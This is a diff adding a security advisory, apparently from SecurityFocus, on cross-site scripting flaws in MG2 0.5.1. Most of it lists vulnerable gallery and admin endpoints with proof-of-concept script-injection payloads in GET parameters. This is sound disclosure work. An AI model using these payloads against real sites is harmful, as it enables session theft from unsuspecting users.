@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/46378/info
+
+MG2 is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+MG2 0.5.1 is vulnerable; other versions may also be affected.
+
+http://www.example.com/mg2/skins/rounded/templates/thumbnails_password.php 
+ - param(GET): list=25<script>alert(1)</script> 
+ - param(GET): id=25<script>alert(1)</script> 
+
+http://www.example.com/mg2/skins/rounded/templates/viewimage_comments.php 
+ - param(GET): id=31<script>alert(1)</script>  
+
+http://www.example.com/mg2/skins/admin/admin1_menu.php 
+ - param(GET): list=41<script>alert(1)</script> 
+
+http://www.example.com/mg2/skins/admin/admin2_comments.php 
+- param(GET): list=45<script>alert(1)</script>  
+
+http://www.example.com/mg2/skins/admin/admin2_edit.php  
+- param(GET): editID=53<script>alert(1)</script>  
+
+http://www.example.com/mg2/skins/admin/admin2_newfolder.php 
+- param(GET): list=59<script>alert(1)</script> 
+
+http://www.example.com/mg2/skins/admin/admin3_folders.php 
+- param(GET): list=71<script>alert(1)</script>
